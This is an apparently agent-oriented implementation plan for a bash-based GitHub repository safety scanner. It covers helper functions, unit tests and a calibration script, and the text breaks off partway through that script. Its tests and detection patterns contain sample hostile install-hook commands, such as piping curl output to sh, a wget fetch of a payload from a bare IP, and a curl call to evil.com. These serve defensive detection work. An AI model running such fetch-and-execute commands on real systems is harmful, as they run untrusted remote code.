# scan-repo Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a Claude Code skill + open-source GitHub repo (`sepivip/scan-repo`, MIT license) that audits a github.com repo for safety signals before the user installs it. Spec: `docs/superpowers/specs/2026-04-14-scan-repo-design.md` (v7).

**Architecture:** SKILL.md is a transparent playbook of `gh` and `curl` commands plus interpretation rules. Deterministic logic (URL extraction, intent token detection, regex matching, allowlist match, verdict computation) lives in pure-bash helper functions in `tools/helpers.sh` — cross-platform (GNU date on Linux, BSD date on macOS, both on git-bash) — so it can be unit-tested. The skill calls these helpers and renders findings + soft verdict + directive closing. Distributed via clone-and-run-`./bin/install` or one-liner `curl … | bash`.

**Tech Stack:** Bash 4+, `gh` CLI (authenticated), `curl`, `jq`, GitHub Actions for CI, plain-bash test framework (no external deps).

**Human gates:** Task 3 (explicit-mode token verification) and Task 30 (integration smoke test) require a real Claude Code session and cannot be run by a subagent.

---

## File Structure

```
e:/GIT/repoguard/                    # dev workspace; will become sepivip/scan-repo on GitHub
├── LICENSE                          # MIT
├── README.md                        # public-facing — created in Task 29
├── SECURITY.md                      # how to report security issues
├── CONTRIBUTING.md                  # how to add to known-good/bad, tune thresholds
├── CHANGELOG.md                     # versioned changes
├── .gitignore
├── .github/
│   ├── ISSUE_TEMPLATE/
│   │   ├── false-positive.yml
│   │   ├── missed-attack.yml
│   │   └── new-check.yml
│   ├── PULL_REQUEST_TEMPLATE.md
│   ├── workflows/
│   │   └── ci.yml                   # runs test-*.sh on Linux + macOS + Windows
│   └── dependabot.yml
├── bin/
│   └── install                      # curl-pipe-bash installer (clone + run tools/install.sh)
├── skill/
│   ├── SKILL.md                     # the playbook
│   └── scan-repo.command.md         # slash command body
├── tools/
│   ├── helpers.sh                   # pure-bash deterministic logic (testable, portable)
│   ├── calibration-check.sh         # runs skill against known-good, counts warns
│   ├── install.sh                   # local install (copy to ~/.claude/)
│   └── install-hooks.sh             # installs pre-commit calibration gate
├── tests/
│   ├── test-framework.sh            # assertions
│   ├── test-helpers.sh              # unit tests for helpers.sh
│   ├── test-skill-structure.sh      # grep validation of SKILL.md
│   ├── test-calibration.sh          # tests for calibration script
│   └── verification-explicit-token.md
└── docs/superpowers/
    ├── specs/
    │   ├── 2026-04-14-scan-repo-design.md
    │   └── calibration/
    │       ├── known-good.txt
    │       ├── known-bad.txt
    │       └── justified-warns.md
    └── plans/
        └── 2026-04-14-scan-repo-implementation.md
```

---

## Phase 0: Project setup

### Task 1: Initialize project structure, git, LICENSE

**Files:**
- Create: `e:/GIT/repoguard/.gitignore`
- Create: `e:/GIT/repoguard/LICENSE`
- Create: `e:/GIT/repoguard/skill/.keep`
- Create: `e:/GIT/repoguard/tools/.keep`
- Create: `e:/GIT/repoguard/tests/.keep`
- Create: `e:/GIT/repoguard/bin/.keep`
- Create: `e:/GIT/repoguard/.github/.keep`

- [ ] **Step 1: Verify workspace state**

Run: `ls e:/GIT/repoguard`
Expected: `docs` directory exists; nothing else.

- [ ] **Step 2: Create the directory skeleton**

Run:
```bash
mkdir -p e:/GIT/repoguard/{skill,tools,tests,bin,.github/ISSUE_TEMPLATE,.github/workflows}
for d in skill tools tests bin .github; do touch "e:/GIT/repoguard/$d/.keep"; done
```

- [ ] **Step 3: Write .gitignore**

Create `e:/GIT/repoguard/.gitignore`:
```
# Editors / OS
.DS_Store
Thumbs.db
*.swp
*~

# Local install / test artifacts
*.local
docs/superpowers/specs/calibration/results-*.md.tmp
tests/_smoke*.sh
tests/_tmp_*

# Shell caches
.env.local
```

- [ ] **Step 4: Write LICENSE (MIT)**

Create `e:/GIT/repoguard/LICENSE`:
```
MIT License

Copyright (c) 2026 sepivip

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

- [ ] **Step 5: Initialize git and commit**

```bash
cd e:/GIT/repoguard && git init && git add . && git commit -m "chore: initial project structure, LICENSE, .gitignore"
```

---

### Task 2: Test framework

**Files:**
- Create: `e:/GIT/repoguard/tests/test-framework.sh`

- [ ] **Step 1: Write the test framework**

Create `e:/GIT/repoguard/tests/test-framework.sh`:
```bash
#!/usr/bin/env bash
# Tiny assertion helpers. No external deps.
# Usage:
#   source tests/test-framework.sh
#   assert_eq "expected" "$actual" "description"
#   assert_true 'some_command arg' "description"
#   assert_false 'some_command arg' "description"
#   report   # exits non-zero if any FAIL

PASS=0
FAIL=0

assert_eq() {
    local expected="$1" actual="$2" desc="$3"
    if [[ "$expected" == "$actual" ]]; then
        PASS=$((PASS + 1))
        printf 'PASS: %s\n' "$desc"
    else
        FAIL=$((FAIL + 1))
        printf 'FAIL: %s\n' "$desc"
        printf '  expected: %q\n' "$expected"
        printf '  actual:   %q\n' "$actual"
    fi
}

assert_true() {
    local cmd="$1" desc="$2"
    if eval "$cmd" >/dev/null 2>&1; then
        PASS=$((PASS + 1))
        printf 'PASS: %s\n' "$desc"
    else
        FAIL=$((FAIL + 1))
        printf 'FAIL: %s (expected success)\n' "$desc"
    fi
}

assert_false() {
    local cmd="$1" desc="$2"
    if ! eval "$cmd" >/dev/null 2>&1; then
        PASS=$((PASS + 1))
        printf 'PASS: %s\n' "$desc"
    else
        FAIL=$((FAIL + 1))
        printf 'FAIL: %s (expected failure)\n' "$desc"
    fi
}

report() {
    printf '\nResults: %d passed, %d failed\n' "$PASS" "$FAIL"
    [[ "$FAIL" -eq 0 ]]
}
```

- [ ] **Step 2: Smoke-test the framework**

Create a temporary `tests/_smoke.sh`:
```bash
#!/usr/bin/env bash
source "$(dirname "$0")/test-framework.sh"
assert_eq "abc" "abc" "string equality works"
assert_true 'true' "true command returns 0"
assert_false 'false' "false command returns non-zero"
report
```

Run: `bash e:/GIT/repoguard/tests/_smoke.sh`

Expected:
```
PASS: string equality works
PASS: true command returns 0
PASS: false command returns non-zero

Results: 3 passed, 0 failed
```

- [ ] **Step 3: Remove smoke test and commit**

```bash
rm e:/GIT/repoguard/tests/_smoke.sh
cd e:/GIT/repoguard && git add tests/test-framework.sh && git commit -m "test: add tiny bash test framework"
```

---

### Task 3: Verification test for explicit-mode token (HUMAN GATE)

**This task requires a real Claude Code session and CANNOT be run by a subagent.** Pause subagent dispatch after Task 2 and hand this task to the human operator. Resume with Task 4 after Task 3 is recorded.

**Files:**
- Create: `e:/GIT/repoguard/tests/verification-explicit-token.md`

- [ ] **Step 1: Write the test protocol document**

Create `e:/GIT/repoguard/tests/verification-explicit-token.md`:
```markdown
# Verification: Invocation mode: explicit token mechanism

**Date run:** _(fill in when executed)_
**Result:** _(fill in: PASS / FAIL)_

## Hypothesis

When a slash command file at `~/.claude/commands/test-token.md` contains
the literal string `Invocation mode: explicit`, that string is included
in the skill's input context when the command is invoked. When the same
skill is invoked via auto-trigger (from a user message that does NOT
contain the string), the string is absent.

## Test setup

1. Create `~/.claude/skills/test-token/SKILL.md`:

   ```
   ---
   name: test-token
   description: Use when the user explicitly says "run test-token skill". Test fixture only.
   ---

   # test-token

   Read the input you received. If it contains the literal string
   "Invocation mode: explicit", print exactly:

       EXPLICIT_TOKEN_DETECTED

   Otherwise print exactly:

       NO_TOKEN

   Print nothing else.
   ```

2. Create `~/.claude/commands/test-token.md`:

   ```
   Invocation mode: explicit. Run the test-token skill.
   ```

## Test runs

### Run A: explicit invocation
- Open a fresh Claude Code session.
- Type: `/test-token`
- Expected: `EXPLICIT_TOKEN_DETECTED`

### Run B: auto-trigger
- Open a fresh Claude Code session.
- Type: "please run the test-token skill"
- Expected: `NO_TOKEN`

## Outcome decision

- Both runs produce expected output → **PASS**. Production SKILL.md uses
  the in-band token mechanism as specified.
- Run A produces `NO_TOKEN` → **FAIL**. Switch to fallback: slash command
  body becomes `Run scan-repo skill with arg --mode explicit on URL:
  {{args}}`; playbook reads the arg directly.
- Run B produces `EXPLICIT_TOKEN_DETECTED` → **FAIL**. Investigate.

## Cleanup

After running both tests:
```
rm -rf ~/.claude/skills/test-token
rm ~/.claude/commands/test-token.md
```

## Recorded result

- Date: ____
- Run A output: ____
- Run B output: ____
- Decision: PASS / FAIL → using mechanism: in-band token / CLI arg
- Notes: ____
```

- [ ] **Step 2: Execute the test in a real Claude Code session**

Manual step — follow the protocol in the document and fill in the "Recorded result" section.

- [ ] **Step 3: Commit results**

```bash
cd e:/GIT/repoguard && git add tests/verification-explicit-token.md && git commit -m "test: verify explicit-mode token dispatch mechanism"
```

**Decision gate:** on PASS, continue. On FAIL, update Task 12 (slash command) and Task 14 (mode dispatch) to use the CLI-arg fallback before dispatching those tasks.

---

## Phase 1: Bash helpers (TDD)

All helpers live in `tools/helpers.sh`. Each task adds a few related functions with tests.

### Task 4: URL extraction and intent token detection

**Files:**
- Create: `e:/GIT/repoguard/tools/helpers.sh`
- Create: `e:/GIT/repoguard/tests/test-helpers.sh`

- [ ] **Step 1: Write the failing tests**

Create `e:/GIT/repoguard/tests/test-helpers.sh`:
```bash
#!/usr/bin/env bash
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/test-framework.sh"
source "$SCRIPT_DIR/../tools/helpers.sh"

# --- extract_url ---
assert_eq "anthropics/claude-code" "$(extract_url 'https://github.com/anthropics/claude-code')" \
    "extract_url: bare repo URL"
assert_eq "facebook/react" "$(extract_url 'should I install https://github.com/facebook/react please')" \
    "extract_url: URL embedded in sentence"
assert_eq "owner/repo@dev" "$(extract_url 'https://github.com/owner/repo/tree/dev')" \
    "extract_url: tree URL with branch"
assert_eq "owner/repo@main" "$(extract_url 'https://github.com/owner/repo/blob/main/src/x.js')" \
    "extract_url: blob URL with branch and path"
assert_eq "owner/repo" "$(extract_url 'https://github.com/owner/repo.git')" \
    "extract_url: strips .git suffix"
assert_eq "" "$(extract_url 'just some text no url')" \
    "extract_url: no URL returns empty"
assert_eq "owner/repo" "$(extract_url 'gh repo clone owner/repo')" \
    "extract_url: gh repo clone shorthand"

# --- has_intent_token ---
assert_true 'has_intent_token "should I install this?"' \
    "has_intent_token: detects install"
assert_true 'has_intent_token "is it safe to use?"' \
    "has_intent_token: detects multi-word safe to"
assert_true 'has_intent_token "Can I trust this repo"' \
    "has_intent_token: case-insensitive"
assert_false 'has_intent_token "here is a github url for reference"' \
    "has_intent_token: no intent → false"
assert_false 'has_intent_token "the installer downloaded fine"' \
    "has_intent_token: installer (substring of install) → not a word match"

report
```

- [ ] **Step 2: Run tests, expect failure**

Run: `bash e:/GIT/repoguard/tests/test-helpers.sh`
Expected: errors about missing helpers.

- [ ] **Step 3: Implement the helpers**

Create `e:/GIT/repoguard/tools/helpers.sh`:
```bash
#!/usr/bin/env bash
# scan-repo helpers — pure bash, no external deps beyond coreutils.
# Sourced by SKILL.md and by tests/test-helpers.sh.
# Target platforms: Linux (GNU coreutils), macOS (BSD coreutils),
# Windows (git-bash, msys2).

# extract_url <input>
# Echoes "owner/repo[@branch]" or empty string if no github URL found.
# Recognizes:
#   https://github.com/owner/repo
#   https://github.com/owner/repo.git
#   https://github.com/owner/repo/tree/<branch>
#   https://github.com/owner/repo/blob/<branch>/...
#   gh repo clone owner/repo
#   git clone https://github.com/owner/repo
extract_url() {
    local input="$1"
    local owner="" repo="" branch=""

    if [[ "$input" =~ github\.com/([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+)(/tree/([A-Za-z0-9_./-]+))? ]]; then
        owner="${BASH_REMATCH[1]}"
        repo="${BASH_REMATCH[2]}"
        branch="${BASH_REMATCH[4]:-}"
    elif [[ "$input" =~ github\.com/([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+)/blob/([A-Za-z0-9_./-]+) ]]; then
        owner="${BASH_REMATCH[1]}"
        repo="${BASH_REMATCH[2]}"
        branch="${BASH_REMATCH[3]%%/*}"
    elif [[ "$input" =~ gh[[:space:]]+repo[[:space:]]+clone[[:space:]]+([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+) ]]; then
        owner="${BASH_REMATCH[1]}"
        repo="${BASH_REMATCH[2]}"
    fi

    [[ -z "$owner" || -z "$repo" ]] && return 0

    repo="${repo%.git}"

    if [[ -n "$branch" ]]; then
        printf '%s/%s@%s\n' "$owner" "$repo" "$branch"
    else
        printf '%s/%s\n' "$owner" "$repo"
    fi
}

# has_intent_token <input>
# Returns 0 (true) if any intent token is present as a word/phrase match.
has_intent_token() {
    local input="$1"
    if printf '%s' "$input" | grep -iqE '\b(should I|is it safe|safe to|can I trust|thoughts on)\b'; then
        return 0
    fi
    if printf '%s' "$input" | grep -iqE '\b(install|clone|try|test|use|run|recommend)\b'; then
        return 0
    fi
    return 1
}
```

- [ ] **Step 4: Run tests, expect pass**

Run: `bash e:/GIT/repoguard/tests/test-helpers.sh`
Expected: 12 PASS, 0 FAIL.

- [ ] **Step 5: Commit**

```bash
cd e:/GIT/repoguard && git add tools/helpers.sh tests/test-helpers.sh && git commit -m "feat(helpers): extract_url and has_intent_token with tests"
```

---

### Task 5: Portable date helper (cross-platform)

The plan invokes `date -d "..."` (GNU date) extensively. macOS ships BSD date which uses `date -j -f "..." "..."`. A single `age_days` helper abstracts this.

**Files:**
- Modify: `e:/GIT/repoguard/tools/helpers.sh` (append)
- Modify: `e:/GIT/repoguard/tests/test-helpers.sh` (append before `report`)

- [ ] **Step 1: Add the failing tests**

Insert before `report` in `tests/test-helpers.sh`:
```bash
# --- age_days (portable) ---
# 2000-01-01 is thousands of days ago on any machine; verify it returns > 9000
AGE=$(age_days "2000-01-01T00:00:00Z")
assert_true "[[ $AGE -gt 9000 ]]" "age_days: year 2000 is > 9000 days ago"

# A date in the near future should yield 0 or negative
FUTURE="2099-01-01T00:00:00Z"
F_AGE=$(age_days "$FUTURE")
assert_true "[[ $F_AGE -lt 100 ]]" "age_days: far future is < 100 (non-positive)"

# Bad input returns 0 and non-zero exit
BAD=$(age_days "not-a-date" 2>/dev/null || true)
assert_eq "0" "$BAD" "age_days: invalid input → 0"
```

- [ ] **Step 2: Run tests, expect failure**

Run: `bash e:/GIT/repoguard/tests/test-helpers.sh`
Expected: errors about missing `age_days`.

- [ ] **Step 3: Implement the helper**

Append to `tools/helpers.sh`:
```bash

# age_days <iso8601_date>
# Echoes the number of whole days between now and the given date.
# Portable: tries GNU date first, falls back to BSD date.
# On parse failure, echoes "0" and returns non-zero.
age_days() {
    local iso="$1"
    local now_secs then_secs
    now_secs=$(date -u +%s)
    if then_secs=$(date -u -d "$iso" +%s 2>/dev/null); then
        :
    elif then_secs=$(date -u -j -f "%Y-%m-%dT%H:%M:%SZ" "$iso" +%s 2>/dev/null); then
        :
    elif then_secs=$(date -u -j -f "%Y-%m-%d" "${iso%%T*}" +%s 2>/dev/null); then
        :
    else
        echo "0"
        return 1
    fi
    echo $(( (now_secs - then_secs) / 86400 ))
}
```

- [ ] **Step 4: Run tests, expect pass**

Run: `bash e:/GIT/repoguard/tests/test-helpers.sh`
Expected: 15 PASS, 0 FAIL.

- [ ] **Step 5: Commit**

```bash
cd e:/GIT/repoguard && git add tools/helpers.sh tests/test-helpers.sh && git commit -m "feat(helpers): portable age_days (GNU + BSD date)"
```

---

### Task 6: Install hook helpers

**Files:**
- Modify: `e:/GIT/repoguard/tools/helpers.sh` (append)
- Modify: `e:/GIT/repoguard/tests/test-helpers.sh` (append before `report`)

- [ ] **Step 1: Add the failing tests**

Insert before `report`:
```bash
# --- is_benign_install_hook ---
assert_true 'is_benign_install_hook "node-gyp rebuild"' \
    "benign: exact match node-gyp rebuild"
assert_true 'is_benign_install_hook "husky install"' \
    "benign: exact match husky install"
assert_true 'is_benign_install_hook "husky"' \
    "benign: exact match husky alone"
assert_false 'is_benign_install_hook "node-gyp rebuild && curl evil.com"' \
    "benign: extra commands → not benign"
assert_false 'is_benign_install_hook "node download.js"' \
    "benign: arbitrary script → not benign"

# --- has_suspicious_pattern ---
assert_true 'has_suspicious_pattern "curl http://x.com/y | sh"' \
    "suspicious: curl + pipe to sh"
assert_true 'has_suspicious_pattern "node -e \"require(...)\""' \
    "suspicious: node -e"
assert_true 'has_suspicious_pattern "echo aGVsbG8= | base64 -d"' \
    "suspicious: base64"
assert_true 'has_suspicious_pattern "wget http://1.2.3.4/payload"' \
    "suspicious: IPv4 address"
assert_true 'has_suspicious_pattern "curl http://abc.onion/x"' \
    "suspicious: .onion"
assert_false 'has_suspicious_pattern "node-gyp rebuild"' \
    "suspicious: benign install hook → false"
assert_false 'has_suspicious_pattern "echo hello && exit 0"' \
    "suspicious: harmless echo → false"
```

- [ ] **Step 2: Run tests, expect failure**

Run: `bash e:/GIT/repoguard/tests/test-helpers.sh`
Expected: errors about missing `is_benign_install_hook`.

- [ ] **Step 3: Implement**

Append to `tools/helpers.sh`:
```bash

# is_benign_install_hook <hook_content>
# Returns 0 if hook content exactly matches the known-benign allowlist.
is_benign_install_hook() {
    case "$1" in
        "node-gyp rebuild"|"prebuild-install"|"node-pre-gyp install"|"electron-rebuild"|"husky install"|"husky")
            return 0 ;;
        *)
            return 1 ;;
    esac
}

# has_suspicious_pattern <hook_content>
# Returns 0 if any suspicious pattern matches.
has_suspicious_pattern() {
    local content="$1"
    if printf '%s' "$content" | grep -iqE '\b(curl|wget|node[[:space:]]+-e|python[[:space:]]+-c|eval|base64|atob)\b'; then
        return 0
    fi
    if printf '%s' "$content" | grep -qE '(^|[^0-9])([0-9]{1,3}\.){3}[0-9]{1,3}([^0-9]|$)'; then
        return 0
    fi
    if printf '%s' "$content" | grep -qiE '\.onion\b'; then
        return 0
    fi
    if printf '%s' "$content" | grep -qE '\|[[:space:]]*(sh|bash)\b'; then
        return 0
    fi
    return 1
}
```

- [ ] **Step 4: Run tests, expect pass**

Run: `bash e:/GIT/repoguard/tests/test-helpers.sh`
Expected: 22 PASS.

- [ ] **Step 5: Commit**

```bash
cd e:/GIT/repoguard && git add tools/helpers.sh tests/test-helpers.sh && git commit -m "feat(helpers): is_benign_install_hook and has_suspicious_pattern"
```

---

### Task 7: Binary classifier helpers

**Files:**
- Modify: `e:/GIT/repoguard/tools/helpers.sh` (append)
- Modify: `e:/GIT/repoguard/tests/test-helpers.sh` (append before `report`)

- [ ] **Step 1: Add the failing tests**

Insert before `report`:
```bash
# --- is_forbidden_executable ---
assert_true 'is_forbidden_executable "bin/runner.exe"' \
    "forbidden: .exe"
assert_true 'is_forbidden_executable "Setup.MSI"' \
    "forbidden: .msi case-insensitive"
assert_true 'is_forbidden_executable "pkg/foo.deb"' \
    "forbidden: .deb"
assert_false 'is_forbidden_executable "lib/native.so"' \
    "forbidden: .so is not forbidden"
assert_false 'is_forbidden_executable "src/main.rs"' \
    "forbidden: source file → false"

# --- is_in_recognized_build_path ---
assert_true 'is_in_recognized_build_path "dist/bundle.js" "package.json"' \
    "build path: dist/ + package.json"
assert_true 'is_in_recognized_build_path "target/release/foo" "Cargo.toml"' \
    "build path: target/ + Cargo.toml"
assert_true 'is_in_recognized_build_path "bin/foo.exe" "go.mod"' \
    "build path: bin/ + go.mod"
assert_false 'is_in_recognized_build_path "dist/bundle.js" "Cargo.toml"' \
    "build path: dist/ without Node marker → false"
assert_false 'is_in_recognized_build_path "target/foo" "package.json"' \
    "build path: target/ without Cargo.toml → false"
assert_false 'is_in_recognized_build_path "src/foo.js" "package.json"' \
    "build path: src/ is not a build path"
```

- [ ] **Step 2: Run, expect failure**

Run: `bash e:/GIT/repoguard/tests/test-helpers.sh`
Expected: missing helper errors.

- [ ] **Step 3: Implement**

Append to `tools/helpers.sh`:
```bash

# is_forbidden_executable <path>
# Returns 0 if the path ends with one of the forbidden installer extensions.
is_forbidden_executable() {
    local lower
    lower="$(printf '%s' "$1" | tr '[:upper:]' '[:lower:]')"
    case "$lower" in
        *.exe|*.msi|*.deb|*.rpm|*.pkg|*.dmg) return 0 ;;
        *) return 1 ;;
    esac
}

# is_in_recognized_build_path <path> <ecosystem_markers_string>
is_in_recognized_build_path() {
    local path="$1" markers="$2"
    case "$path" in
        dist/*|build/*|out/*)
            printf '%s' "$markers" | grep -qE '(package\.json|webpack\.config|vite\.config|rollup\.config)' && return 0
            ;;
        target/*)
            printf '%s' "$markers" | grep -qE 'Cargo\.toml' && return 0
            ;;
        bin/*)
            printf '%s' "$markers" | grep -qE '(Makefile|build\.sh|go\.mod)' && return 0
            ;;
        _output/*)
            printf '%s' "$markers" | grep -qE '(Makefile|go\.mod)' && return 0
            ;;
    esac
    return 1
}
```

- [ ] **Step 4: Run tests, expect pass**

Run: `bash e:/GIT/repoguard/tests/test-helpers.sh`
Expected: 33 PASS.

- [ ] **Step 5: Commit**

```bash
cd e:/GIT/repoguard && git add tools/helpers.sh tests/test-helpers.sh && git commit -m "feat(helpers): forbidden-extension and build-path classifiers"
```

---

### Task 8: Empty-profile and verdict helpers

**Files:**
- Modify: `e:/GIT/repoguard/tools/helpers.sh` (append)
- Modify: `e:/GIT/repoguard/tests/test-helpers.sh` (append before `report`)

- [ ] **Step 1: Add the failing tests**

Insert before `report`:
```bash
# --- is_empty_profile ---
# Use hardcoded ISO dates for cross-platform reproducibility.
# "recent" = any date in the last 30 days; we fake this by using a date
# close to "now" — since tests run in the future, we pick 2026-04-01
# (within 90 days of the 2026-04-14 spec date; may drift in CI).
# To avoid drift, use relative computation via age_days itself.
RECENT_ISO=$(date -u +%Y-%m-%dT00:00:00Z)  # today UTC — 0 days ago
OLD_ISO="2020-01-01T00:00:00Z"              # decidedly > 90 days

assert_true "is_empty_profile '$RECENT_ISO' 0 0" \
    "empty profile: 0/0 + young account → empty"
assert_false "is_empty_profile '$OLD_ISO' 0 0" \
    "empty profile: 0/0 but old account → not empty"
assert_false "is_empty_profile '$RECENT_ISO' 5 0" \
    "empty profile: has followers → not empty"
assert_false "is_empty_profile '$RECENT_ISO' 0 3" \
    "empty profile: has repos → not empty"

# --- compute_verdict ---
assert_eq "green" "$(compute_verdict 0 0 0)" \
    "verdict: 0 of everything → green"
assert_eq "yellow" "$(compute_verdict 0 1 0)" \
    "verdict: 1 warn → yellow"
assert_eq "yellow" "$(compute_verdict 0 5 0)" \
    "verdict: many warns no high-confidence → still yellow"
assert_eq "red" "$(compute_verdict 1 0 0)" \
    "verdict: 1 high-confidence → red"
assert_eq "red" "$(compute_verdict 1 5 5)" \
    "verdict: high-confidence wins over everything"
assert_eq "white" "$(compute_verdict 0 0 3)" \
    "verdict: 3 skips → white"
assert_eq "white" "$(compute_verdict 0 1 4)" \
    "verdict: skips threshold beats yellow"

# --- verdict_label ---
assert_true 'verdict_label green | grep -q "Nothing obviously wrong"' \
    "verdict_label: green contains caveat"
assert_true 'verdict_label red | grep -q "without expert review"' \
    "verdict_label: red contains caveat"
```

- [ ] **Step 2: Run, expect failure**

Run: `bash e:/GIT/repoguard/tests/test-helpers.sh`

- [ ] **Step 3: Implement**

Append to `tools/helpers.sh`:
```bash

# is_empty_profile <created_at_iso> <followers> <public_repos>
# Returns 0 if the profile matches the empty pattern: zero followers AND
# zero public repos AND account age < 90 days. Uses portable age_days.
is_empty_profile() {
    local created_at="$1"
    local followers="$2"
    local repos="$3"
    [[ "$followers" -ne 0 ]] && return 1
    [[ "$repos" -ne 0 ]] && return 1
    local days
    days=$(age_days "$created_at") || return 1
    [[ "$days" -lt 90 ]]
}

# compute_verdict <high_confidence_warn_count> <total_warn_count> <skip_count>
# Echoes one of: green | yellow | red | white
compute_verdict() {
    local hc="$1" warns="$2" skips="$3"
    if [[ "$hc" -gt 0 ]]; then
        echo "red"
    elif [[ "$skips" -ge 3 ]]; then
        echo "white"
    elif [[ "$warns" -ge 1 ]]; then
        echo "yellow"
    else
        echo "green"
    fi
}

# verdict_label <verdict>
# Echoes the soft, caveated label string for the given verdict color.
verdict_label() {
    case "$1" in
        green)  echo "🟢 Nothing obviously wrong — proceed if you trust the source" ;;
        yellow) echo "🟡 A few things look unusual — worth a closer look" ;;
        red)    echo "🔴 Several things look concerning — recommend not installing without expert review" ;;
        white)  echo "⚪ Couldn't gather enough signal — cannot assess" ;;
        *)      echo "[scan-repo: unknown verdict state: $1]" ;;
    esac
}
```

- [ ] **Step 4: Run tests, expect pass**

Run: `bash e:/GIT/repoguard/tests/test-helpers.sh`
Expected: 46 PASS.

- [ ] **Step 5: Commit**

```bash
cd e:/GIT/repoguard && git add tools/helpers.sh tests/test-helpers.sh && git commit -m "feat(helpers): empty-profile, verdict computation, verdict labels"
```

---

## Phase 2: Calibration tooling

### Task 9: Justified-warns registry stub

**Files:**
- Create: `e:/GIT/repoguard/docs/superpowers/specs/calibration/justified-warns.md`

- [ ] **Step 1: Write the file**

Create `e:/GIT/repoguard/docs/superpowers/specs/calibration/justified-warns.md`:
```markdown
# Justified warns on known-good repos

Format: one entry per known-good repo that has a *justified* warn under
the current SKILL.md. Calibration script (`tools/calibration-check.sh`)
reads this file to decide whether a warn on the known-good list counts
toward the failure threshold.

## Format

\`\`\`
## owner/repo
- check: <check number>
- pattern: <one-line description of the warn output>
- justification: <why this is acceptable>
\`\`\`

## Entries

(none yet — populated as calibration runs surface specific patterns)
```

- [ ] **Step 2: Commit**

```bash
cd e:/GIT/repoguard && git add docs/superpowers/specs/calibration/justified-warns.md && git commit -m "docs(calibration): justified-warns registry stub"
```

---

### Task 10: Calibration check script

**Files:**
- Create: `e:/GIT/repoguard/tools/calibration-check.sh`
- Create: `e:/GIT/repoguard/tests/test-calibration.sh`

- [ ] **Step 1: Write the failing tests**

Create `e:/GIT/repoguard/tests/test-calibration.sh`:
```bash
#!/usr/bin/env bash
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/test-framework.sh"

CALIB="$SCRIPT_DIR/../tools/calibration-check.sh"

assert_true "[[ -x '$CALIB' ]]" "calibration-check.sh exists and is executable"

assert_true "bash '$CALIB' --dry-run --good-list /dev/null" \
    "calibration-check.sh --dry-run on empty list returns success"

TMP_GOOD=$(mktemp)
echo "https://github.com/fake/repo1" >> "$TMP_GOOD"
echo "https://github.com/fake/repo2" >> "$TMP_GOOD"
echo "https://github.com/fake/repo3" >> "$TMP_GOOD"

SCAN_REPO_FAKE_WARN_COUNT=1 bash "$CALIB" --dry-run --good-list "$TMP_GOOD" --threshold 3 >/dev/null 2>&1
rc=$?
assert_eq "1" "$rc" "calibration: 3 repos x 1 warn = 3 → exit 1"

SCAN_REPO_FAKE_WARN_COUNT=0 bash "$CALIB" --dry-run --good-list "$TMP_GOOD" --threshold 3 >/dev/null 2>&1
rc=$?
assert_eq "0" "$rc" "calibration: 0 warns → exit 0"

rm -f "$TMP_GOOD"
report
```

- [ ] **Step 2: Run, expect failure**

Run: `bash e:/GIT/repoguard/tests/test-calibration.sh`

- [ ] **Step 3: Implement**

Create `e:/GIT/repoguard/tools/calibration-check.sh`:
```bash
#!/usr/bin/env bash
# scan-repo calibration check.
#
# Runs the scan-repo skill (full audit) against each URL in known-good.txt,
# counts warns, and exits non-zero if threshold or more unjustified warns
# surface.
#
# Usage:
#   tools/calibration-check.sh
#   tools/calibration-check.sh --good-list path/to/list.txt --threshold 3
#   tools/calibration-check.sh --dry-run   # skip gh, use SCAN_REPO_FAKE_WARN_COUNT env

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

GOOD_LIST="$REPO_ROOT/docs/superpowers/specs/calibration/known-good.txt"
JUSTIFIED="$REPO_ROOT/docs/superpowers/specs/calibration/justified-warns.md"
THRESHOLD=3
DRY_RUN=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        --good-list) GOOD_LIST="$2"; shift 2 ;;
        --threshold) THRESHOLD="$2"; shift 2 ;;
        --dry-run)   DRY_RUN=1; shift ;;
        *) echo "Unknown arg: $1" >&2; exit 2 ;;
    esac
done

if [[ ! -f "$GOOD_LIST" ]]; then
    echo "calibration: known-good list not found: $GOOD_LIST" >&2
    exit 2
fi

count_warns_for_url() {
    local url="$1"
    if [[ "$DRY_RUN" -eq 1 ]]; then
        echo "${SCAN_REPO_FAKE_WARN_COUNT:-0}"
        return 0
    fi
    if [[ ! -x "$REPO_ROOT/tools/run-skill.sh" ]]; then
        echo "calibration: tools/run-skill.sh not found — live calibration requires runner" >&2
        return 0
    fi
    "$REPO_ROOT/tools/run-skill.sh" --url "$url" --mode full --output-format count-warns
}

count_justified_for_url() {
    local url="$1"
    local owner_repo
    owner_repo="$(echo "$url" | sed -E 's#https?://github\.com/##; s#/$##')"
    if [[ ! -f "$JUSTIFIED" ]]; then
        echo 0
        return
    fi
    awk -v target="$owner_repo" '
        /^## / { in_section = ($2 == target); next }
        in_section && /^- check:/ { count++ }
        END { print count + 0 }
    ' "$JUSTIFIED"
}

total_unjustified=0
repo_count=0

while IFS= read -r line; do
